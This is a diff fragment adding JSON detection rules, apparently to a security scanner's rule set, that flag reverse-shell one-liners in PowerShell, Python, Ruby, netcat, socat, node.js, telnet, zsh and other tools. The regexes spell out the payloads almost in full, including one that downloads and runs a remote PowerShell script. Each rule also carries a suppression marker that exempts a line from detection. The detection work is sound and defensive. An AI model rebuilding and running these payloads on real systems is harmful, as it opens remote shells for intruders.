+      "weight": 5,
+      "pattern": "powershell\\s+\\-nop\\s+\\-c\\s+\"\\$client\\s+=\\s+New\\-Object\\s+System\\.Net\\.Sockets\\.TCPClient\\('[\\w.\\-]+',\\d+\\);\\$stream\\s+=\\s+\\$client\\.GetStream\\(\\);\\[byte\\[\\]\\]\\$bytes\\s+=\\s+0\\.\\.65535\\|%\\S+;while\\(\\(\\$i\\s+=\\s+\\$stream\\.Read\\(\\$bytes,\\s+0,\\s+\\$bytes\\.Length\\)\\)\\s+\\-ne\\s+0\\)\\S+;\\$client\\.Close\\(\\)\"",
+      "description": "Reverse shell payload (PowerShell #2) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-054",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "powershell\\s+\\-nop\\s+\\-W\\s+hidden\\s+\\-noni\\s+\\-ep\\s+bypass\\s+\\-c\\s+\"\\$TCPClient\\s+=\\s+New\\-Object\\s+Net\\.Sockets\\.TCPClient\\('[\\w.\\-]+',\\s+\\d+\\);\\$NetworkStream\\s+=\\s+\\$TCPClient\\.GetStream\\(\\);\\$StreamWriter\\s+=\\s+New\\-Object\\s+IO\\.StreamWriter\\(\\$NetworkStream\\);function\\s+WriteToStream\\s+\\(\\$String\\)\\s+\\{\\[byte\\[\\]\\]\\$script:Buffer\\s+=\\s+0\\.\\.\\$TCPClient\\.ReceiveBufferSize\\s+\\|\\s+%\\s+\\S+;\\$StreamWriter\\.Write\\(\\$String\\s+\\+\\s+'SHELL>\\s+'\\);\\$StreamWriter\\.Flush\\(\\)\\}WriteToStream\\s+'';while\\(\\(\\$BytesRead\\s+=\\s+\\$NetworkStream\\.Read\\(\\$Buffer,\\s+0,\\s+\\$Buffer\\.Length\\)\\)\\s+\\-gt\\s+0\\)\\s+\\{\\$Command\\s+=\\s+\\(\\[text\\.encoding\\]::UTF8\\)\\.GetString\\(\\$Buffer,\\s+0,\\s+\\$BytesRead\\s+\\-\\s+1\\);\\$Output\\s+=\\s+try\\s+\\S+\\s+catch\\s+\\S+WriteToStream\\s+\\(\\$Output\\)\\}\\$StreamWriter\\.Close\\(\\)\"",
+      "description": "Reverse shell payload (PowerShell #3) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-055",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "PowerShell\\s+\\#3\\s+\\(Base64\\)",
+      "description": "Reverse shell payload (PowerShell #3 (Base64)) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-056",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "\\$sslProtocols\\s+=\\s+\\[System\\.Security\\.Authentication\\.SslProtocols\\]::Tls12;\\s+\\$TCPClient\\s+=\\s+New\\-Object\\s+Net\\.Sockets\\.TCPClient\\('[\\w.\\-]+',\\s+\\d+\\);\\$NetworkStream\\s+=\\s+\\$TCPClient\\.GetStream\\(\\);\\$SslStream\\s+=\\s+New\\-Object\\s+Net\\.Security\\.SslStream\\(\\$NetworkStream,\\$false,\\(\\S+\\s+\\-as\\s+\\[Net\\.Security\\.RemoteCertificateValidationCallback\\]\\)\\);\\$SslStream\\.AuthenticateAsClient\\('cloudflare\\-dns\\.com',\\$null,\\$sslProtocols,\\$false\\);if\\(!\\$SslStream\\.IsEncrypted\\s+\\-or\\s+!\\$SslStream\\.IsSigned\\)\\s+\\S+\\$StreamWriter\\s+=\\s+New\\-Object\\s+IO\\.StreamWriter\\(\\$SslStream\\);function\\s+WriteToStream\\s+\\(\\$String\\)\\s+\\S+;WriteToStream\\s+'';while\\(\\(\\$BytesRead\\s+=\\s+\\$SslStream\\.Read\\(\\$Buffer,\\s+0,\\s+\\$Buffer\\.Length\\)\\)\\s+\\-gt\\s+0\\)\\s+\\{\\$Command\\s+=\\s+\\(\\[text\\.encoding\\]::UTF8\\)\\.GetString\\(\\$Buffer,\\s+0,\\s+\\$BytesRead\\s+\\-\\s+1\\);\\$Output\\s+=\\s+try\\s+\\S+\\s+catch\\s+\\S+WriteToStream\\s+\\(\\$Output\\)\\}\\$StreamWriter\\.Close\\(\\)",
+      "description": "Reverse shell payload (PowerShell #4 (TLS)) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-057",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "PowerShell\\s+\\#5\\s+\\(stderr\\s+support\\)\\s+\\(Base64\\)",
+      "description": "Reverse shell payload (PowerShell #5 (stderr support) (Base64)) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-058",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "export\\s+RHOST=\"[\\w.\\-]+\";export\\s+RPORT=\\d+;python\\s+\\-c\\s+'import\\s+sys,socket,os,pty;s=socket\\.socket\\(\\);s\\.connect\\(\\(os\\.getenv\\(\"RHOST\"\\),int\\(os\\.getenv\\(\"RPORT\"\\)\\)\\)\\);\\[os\\.dup2\\(s\\.fileno\\(\\),fd\\)\\s+for\\s+fd\\s+in\\s+\\(0,1,2\\)\\];pty\\.spawn\\(\"\\S+\"\\)'",
+      "description": "Reverse shell payload (Python #1) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-059",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "python\\s+\\-c\\s+'import\\s+socket,subprocess,os;s=socket\\.socket\\(socket\\.AF_INET,socket\\.SOCK_STREAM\\);s\\.connect\\(\\(\"[\\w.\\-]+\",\\d+\\)\\);os\\.dup2\\(s\\.fileno\\(\\),0\\);\\s+os\\.dup2\\(s\\.fileno\\(\\),1\\);os\\.dup2\\(s\\.fileno\\(\\),2\\);import\\s+pty;\\s+pty\\.spawn\\(\"\\S+\"\\)'",
+      "description": "Reverse shell payload (Python #2) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-060",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "export\\s+RHOST=\"[\\w.\\-]+\";export\\s+RPORT=\\d+;python3\\s+\\-c\\s+'import\\s+sys,socket,os,pty;s=socket\\.socket\\(\\);s\\.connect\\(\\(os\\.getenv\\(\"RHOST\"\\),int\\(os\\.getenv\\(\"RPORT\"\\)\\)\\)\\);\\[os\\.dup2\\(s\\.fileno\\(\\),fd\\)\\s+for\\s+fd\\s+in\\s+\\(0,1,2\\)\\];pty\\.spawn\\(\"\\S+\"\\)'",
+      "description": "Reverse shell payload (Python3 #1) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-061",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "python3\\s+\\-c\\s+'import\\s+socket,subprocess,os;s=socket\\.socket\\(socket\\.AF_INET,socket\\.SOCK_STREAM\\);s\\.connect\\(\\(\"[\\w.\\-]+\",\\d+\\)\\);os\\.dup2\\(s\\.fileno\\(\\),0\\);\\s+os\\.dup2\\(s\\.fileno\\(\\),1\\);os\\.dup2\\(s\\.fileno\\(\\),2\\);import\\s+pty;\\s+pty\\.spawn\\(\"\\S+\"\\)'",
+      "description": "Reverse shell payload (Python3 #2) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-062",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "import\\s+os,socket,subprocess,threading;\\s+def\\s+s2p\\(s,\\s+p\\):\\s+while\\s+True:\\s+data\\s+=\\s+s\\.recv\\(1024\\)\\s+if\\s+len\\(data\\)\\s+>\\s+0:\\s+p\\.stdin\\.write\\(data\\)\\s+p\\.stdin\\.flush\\(\\)\\s+def\\s+p2s\\(s,\\s+p\\):\\s+while\\s+True:\\s+s\\.send\\(p\\.stdout\\.read\\(1\\)\\)\\s+s=socket\\.socket\\(socket\\.AF_INET,socket\\.SOCK_STREAM\\)\\s+s\\.connect\\(\\(\"[\\w.\\-]+\",\\d+\\)\\)\\s+p=subprocess\\.Popen\\(\\[\"\\S+\"\\],\\s+stdout=subprocess\\.PIPE,\\s+stderr=subprocess\\.STDOUT,\\s+stdin=subprocess\\.PIPE\\)\\s+s2p_thread\\s+=\\s+threading\\.Thread\\(target=s2p,\\s+args=\\[s,\\s+p\\]\\)\\s+s2p_thread\\.daemon\\s+=\\s+True\\s+s2p_thread\\.start\\(\\)\\s+p2s_thread\\s+=\\s+threading\\.Thread\\(target=p2s,\\s+args=\\[s,\\s+p\\]\\)\\s+p2s_thread\\.daemon\\s+=\\s+True\\s+p2s_thread\\.start\\(\\)\\s+try:\\s+p\\.wait\\(\\)\\s+except\\s+KeyboardInterrupt:\\s+s\\.close\\(\\)",
+      "description": "Reverse shell payload (Python3 Windows) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-063",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "python3\\s+\\-c\\s+'import\\s+os,pty,socket;s=socket\\.socket\\(\\);s\\.connect\\(\\(\"[\\w.\\-]+\",\\d+\\)\\);\\[os\\.dup2\\(s\\.fileno\\(\\),f\\)for\\s+f\\s+in\\(0,1,2\\)\\];pty\\.spawn\\(\"\\S+\"\\)'",
+      "description": "Reverse shell payload (Python3 shortest) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-064",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "ruby\\s+\\-rsocket\\s+\\-e'spawn\\(\"sh\",\\[:in,:out,:err\\]=>TCPSocket\\.new\\(\"[\\w.\\-]+\",\\d+\\)\\)'",
+      "description": "Reverse shell payload (Ruby #1) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-065",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "ruby\\s+\\-rsocket\\s+\\-e'exit\\s+if\\s+fork;c=TCPSocket\\.new\\(\"[\\w.\\-]+\",\"\\d+\"\\);loop\\{c\\.gets\\.chomp!;\\(exit!\\s+if\\s+\\$_==\"exit\"\\);\\(\\$_=\\~/cd\\s+\\(\\.\\+\\)/i\\?\\(Dir\\.chdir\\(\\$1\\)\\):\\(IO\\.popen\\(\\$_,\\?r\\)\\S+\\)\\)rescue\\s+c\\.puts\\s+\"failed:\\s+\\#\\S+\"\\}'",
+      "description": "Reverse shell payload (Ruby no sh) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-066",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "echo\\s+'import\\s+os'\\s+>\\s+/tmp/t\\.v\\s+\\&\\&\\s+echo\\s+'fn\\s+main\\(\\)\\s+\\S+'\\s+>>\\s+/tmp/t\\.v\\s+\\&\\&\\s+v\\s+run\\s+/tmp/t\\.v\\s+\\&\\&\\s+rm\\s+/tmp/t\\.v",
+      "description": "Reverse shell payload (Vlang) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-067",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "IEX\\(IWR\\s+https://raw\\.githubusercontent\\.com/antonioCoco/ConPtyShell/master/Invoke\\-ConPtyShell\\.ps1\\s+\\-UseBasicParsing\\);\\s+Invoke\\-ConPtyShell\\s+[\\w.\\-]+\\s+\\d+",
+      "description": "Reverse shell payload (Windows ConPty) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-068",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "C='curl\\s+\\-Ns\\s+telnet://[\\w.\\-]+:\\d+';\\s+\\$C\\s+</dev/null\\s+2>\\&1\\s+\\|\\s+\\S+\\s+2>\\&1\\s+\\|\\s+\\$C\\s+>/dev/null",
+      "description": "Reverse shell payload (curl) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-069",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "rm\\s+/tmp/f;mkfifo\\s+/tmp/f;cat\\s+/tmp/f\\|\\S+\\s+\\-i\\s+2>\\&1\\|nc\\s+[\\w.\\-]+\\s+\\d+\\s+>/tmp/f",
+      "description": "Reverse shell payload (nc mkfifo) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-070",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "nc\\.exe\\s+[\\w.\\-]+\\s+\\d+\\s+\\-e\\s+\\S+",
+      "description": "Reverse shell payload (nc.exe -e) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-071",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "ncat\\s+[\\w.\\-]+\\s+\\d+\\s+\\-e\\s+\\S+",
+      "description": "Reverse shell payload (ncat -e) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-072",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "rm\\s+/tmp/f;mkfifo\\s+/tmp/f;cat\\s+/tmp/f\\|\\S+\\s+\\-i\\s+2>\\&1\\|ncat\\s+\\-u\\s+[\\w.\\-]+\\s+\\d+\\s+>/tmp/f",
+      "description": "Reverse shell payload (ncat udp) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-073",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "ncat\\.exe\\s+[\\w.\\-]+\\s+\\d+\\s+\\-e\\s+\\S+",
+      "description": "Reverse shell payload (ncat.exe -e) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-074",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "require\\('child_process'\\)\\.exec\\('nc\\s+\\-e\\s+\\S+\\s+[\\w.\\-]+\\s+\\d+'\\)",
+      "description": "Reverse shell payload (node.js) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-075",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "\\(function\\(\\)\\{\\\\r\\s+var\\s+net\\s+=\\s+require\\(\"net\"\\),\\\\r\\s+cp\\s+=\\s+require\\(\"child_process\"\\),\\\\r\\s+sh\\s+=\\s+cp\\.spawn\\(\"\\\\\\S+\",\\s+\\[\\]\\);\\\\r\\s+var\\s+client\\s+=\\s+new\\s+net\\.Socket\\(\\);\\\\r\\s+client\\.connect\\(\\d+,\\s+\"[\\w.\\-]+\",\\s+function\\(\\)\\S+\\);\\\\r\\s+return\\s+/a/;\\s+//\\s+Prevents\\s+the\\s+Node\\.js\\s+application\\s+from\\s+crashing\\\\r\\s+\\}\\)\\(\\);",
+      "description": "Reverse shell payload (node.js #2) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-076",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "rcat\\s+connect\\s+\\-s\\s+\\S+\\s+[\\w.\\-]+\\s+\\d+",
+      "description": "Reverse shell payload (rustcat) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-077",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "socat\\s+TCP:[\\w.\\-]+:\\d+\\s+EXEC:\\S+",
+      "description": "Reverse shell payload (socat #1) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-078",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "socat\\s+TCP:[\\w.\\-]+:\\d+\\s+EXEC:'\\S+',pty,stderr,setsid,sigint,sane",
+      "description": "Reverse shell payload (socat #2 (TTY)) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-079",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "sqlite3\\s+/dev/null\\s+'\\.shell\\s+rm\\s+/tmp/f;mkfifo\\s+/tmp/f;cat\\s+/tmp/f\\|\\S+\\s+\\-i\\s+2>\\&1\\|nc\\s+[\\w.\\-]+\\s+\\d+\\s+>/tmp/f'",
+      "description": "Reverse shell payload (sqlite3 nc mkfifo) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-080",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "TF=\\$\\(mktemp\\s+\\-u\\);mkfifo\\s+\\$TF\\s+\\&\\&\\s+telnet\\s+[\\w.\\-]+\\s+\\d+\\s+0<\\$TF\\s+\\|\\s+\\S+\\s+1>\\$TF",
+      "description": "Reverse shell payload (telnet) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-081",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "zsh\\s+\\-c\\s+'zmodload\\s+zsh/net/tcp\\s+\\&\\&\\s+ztcp\\s+[\\w.\\-]+\\s+\\d+\\s+\\&\\&\\s+zsh\\s+>\\&\\$REPLY\\s+2>\\&\\$REPLY\\s+0>\\&\\$REPLY'",
+      "description": "Reverse shell payload (zsh) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    }
+  ],
+  "provenance_rules": []
+}
